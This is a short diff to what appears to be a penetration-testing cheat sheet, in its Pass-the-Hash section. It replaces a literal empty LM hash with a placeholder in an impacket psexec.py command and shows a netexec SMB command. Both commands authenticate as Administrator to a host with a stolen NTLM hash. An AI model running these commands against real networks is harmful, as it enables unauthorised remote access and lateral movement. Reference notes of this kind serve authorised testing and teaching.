@@ -166,7 +166,7 @@ Pass-the-Hash / Pass-the-Ticket.
 **Pass-the-Hash:**
 
     # With impacket (secretsdump output -> psexec)
-    psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> corp.local/Administrator@10.10.10.10
+    psexec.py -hashes <LM_HASH_EMPTY>:<NTLM_HASH> corp.local/Administrator@10.10.10.10
 
     # With netexec
     netexec smb 10.10.10.10 -u Administrator -H <NTLM_HASH>
